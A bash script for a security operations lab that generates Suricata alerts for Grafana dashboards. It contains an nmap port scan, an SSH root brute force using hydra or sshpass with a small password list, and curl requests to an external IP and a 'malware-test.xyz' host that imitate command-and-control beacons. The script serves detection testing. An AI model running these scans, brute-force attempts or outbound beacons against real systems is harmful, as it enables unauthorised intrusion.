#!/bin/bash
#
# simulate-attacks.sh — Lightweight attack simulation for SOC demo
# Generates realistic alerts in Suricata → ClickHouse → Grafana
#
# NOTE: This script requires live Suricata running on the host (sudo systemctl start suricata).
#       For offline pcap replay without live Suricata, use: ./scripts/replay-attacks.sh
#
# Usage:
#   ./simulate-attacks.sh           # Run all simulations
#   ./simulate-attacks.sh fast       # Run faster (fewer probes)
#   ./simulate-attacks.sh status     # Check if Suricata is running

set -e

TARGET="${TARGET:-127.0.0.1}"
PASS_LIST="/tmp/small-passwords.txt"

check_suricata() {
    if ! pgrep -x suricata > /dev/null 2>&1; then
        echo "WARNING: Suricata does not appear to be running."
        echo "Start it with: sudo systemctl start suricata"
        exit 1
    fi
    echo "Suricata is running."
}

create_password_list() {
    if [ ! -f "$PASS_LIST" ]; then
        echo "Creating small password list..."
        cat > "$PASS_LIST" << 'EOF'
123456
password
admin
letmein
welcome
monkey
dragon
master
qwerty
login
EOF
    fi
}

simulate_port_scan() {
    echo ""
    echo "[1/4] Port scan (nmap -T4 -p 22,80,443,8080,3306 $TARGET)"
    nmap -T4 -p 22,80,443,8080,3306 "$TARGET" 2>/dev/null || true
    echo "Done. Check Grafana for ET SCAN alerts."
    sleep 2
}

simulate_ssh_brute_force() {
    echo ""
    echo "[2/4] SSH brute force attempt (hydra, 10 passwords)"
    if command -v hydra &>/dev/null; then
        hydra -l root -P "$PASS_LIST" -t 2 -W 1 "$TARGET" ssh 2>/dev/null || true
    else
        echo "hydra not installed, using sshpass instead..."
        if command -v sshpass &>/dev/null; then
            while IFS= read -r pass; do
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
                    root@"$TARGET" exit 2>/dev/null || true
            done < "$PASS_LIST"
        else
            echo "Neither hydra nor sshpass found. Install one:"
            echo "  sudo apt install hydra"
            echo "  sudo apt install sshpass"
        fi
    fi
    echo "Done. Check Grafana for SSH brute alerts."
    sleep 2
}

simulate_icmp_probe() {
    echo ""
    echo "[3/4] ICMP probe (ping sweep simulated)"
    ping -c 3 "$TARGET" 2>/dev/null || true
    echo "Done. Check Grafana for ICMP alerts."
    sleep 1
}

simulate_c2_beacon() {
    echo ""
    echo "[4/4] C2 beacon simulation (curl to .exe on external IP)"
    curl -s -m 3 "http://185.220.101.99/update.exe" > /dev/null 2>&1 || true
    curl -s -m 3 "http://malware-test.xyz/beacon" > /dev/null 2>&1 || true
    echo "Done. Check Grafana for beacon/C2 alerts."
}

status() {
    echo "=== SOC Lab Status ==="
    check_suricata
    echo ""
    echo "ClickHouse: $(curl -s -o /dev/null -w '%{http_code}' http://localhost:8123/ping 2>/dev/null || echo 'not reachable')"
    echo "Grafana:   $(curl -s -o /dev/null -w '%{http_code}' http://localhost:3000 2>/dev/null || echo 'not reachable')"
    echo "n8n:       $(curl -s -o /dev/null -w '%{http_code}' http://localhost:5678 2>/dev/null || echo 'not reachable')"
}

case "${1:-all}" in
    fast)
        check_suricata
        simulate_port_scan
        simulate_icmp_probe
        ;;
    all)
        check_suricata
        create_password_list
        simulate_port_scan
        simulate_ssh_brute_force
        simulate_icmp_probe
        simulate_c2_beacon
        ;;
    status)
        status
        ;;
    *)
        echo "Usage: $0 [all|fast|status]"
        exit 1
        ;;
esac

echo ""
echo "All simulations complete. Open Grafana at http://localhost:3000"
echo "to view real-time alerts in your SOC dashboards."
